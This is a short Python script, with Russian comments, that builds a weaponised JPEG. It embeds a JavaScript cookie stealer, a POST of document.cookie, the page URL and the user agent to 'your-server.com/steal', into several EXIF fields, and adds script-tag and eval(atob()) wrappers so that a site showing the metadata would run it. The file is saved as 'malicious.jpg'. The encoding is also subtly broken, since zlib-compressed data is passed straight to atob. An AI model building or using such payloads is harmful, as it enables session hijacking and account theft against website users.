#!/usr/bin/env python3
from PIL import Image
import piexif
import base64
import zlib

# Ваш JS код
js_code = """
fetch('https://your-server.com/steal', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        cookies: document.cookie,
        url: location.href,
        ua: navigator.userAgent
    })
});
"""

# Сжимаем и кодируем
compressed = zlib.compress(js_code.encode())
b64_js = base64.b64encode(compressed).decode()

# Открываем изображение
img = Image.open("clean.jpg")

# СОЗДАЕМ НОВЫЙ EXIF, если его нет
exif_dict = {"0th": {}, "Exif": {}, "GPS": {}, "1st": {}}

# Добавляем данные в 0th (ImageIFD)
exif_dict["0th"][piexif.ImageIFD.XPComment] = f"__{b64_js}__".encode('utf-16le')

# Добавляем в Exif
exif_dict["Exif"][piexif.ExifIFD.UserComment] = f"<script>eval(atob('{b64_js}'))</script>".encode()

# Добавляем в Artist поле
exif_dict["0th"][piexif.ImageIFD.Artist] = f"eval(atob('{b64_js}'))".encode()

# Конвертируем в байты
exif_bytes = piexif.dump(exif_dict)

# Сохраняем с EXIF
img.save("malicious.jpg", exif=exif_bytes, quality=95)

print("[+] Готово: malicious.jpg")